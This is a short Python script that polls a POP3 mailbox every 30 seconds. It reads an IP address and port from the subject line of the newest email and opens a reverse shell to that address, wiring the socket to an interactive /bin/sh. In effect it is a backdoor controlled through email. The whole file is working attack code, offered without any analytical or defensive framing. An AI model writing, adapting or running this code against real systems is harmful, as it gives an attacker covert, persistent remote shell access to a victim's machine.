#!/usr/bin/env python


import os
import re
import poplib
import socket
import subprocess
from time import sleep
from email import parser


class mailer:

    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password

    def reverseshell(self):
        pop_conn = poplib.POP3_SSL(self.host)
        pop_conn.user(self.username)
        pop_conn.pass_(self.password)

        # Get messages from server:
        messages = [pop_conn.retr(i) for i in range(
            1, len(pop_conn.list()[1]) + 1)]

        # Concat message pieces:
        messages = ["\n".join(mssg[1]) for mssg in messages]

        # Parse message intom an email object:
        messages = [parser.Parser().parsestr(mssg) for mssg in messages]

        # Gain reverse shell addr
        reip = re.compile(r'(?<![\.\d])(?:\d{1,3}\.){3}\d{1,3}(?![\.\d])')
        address = messages[-1]['Subject']
        ip = reip.findall(address)[0]
        if ip:
            port = address.split(':')[1]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            p = subprocess.call(["/bin/sh", "-i"])
        pop_conn.quit()


if __name__ == "__main__":
    host = 'pop3.sina.com'
    username = 'xxx@sina.com'
    password = 'xxxxxx'
    mailer = mailer(host, username, password)
    while True:
        mailer.reverseshell()
        sleep(30)
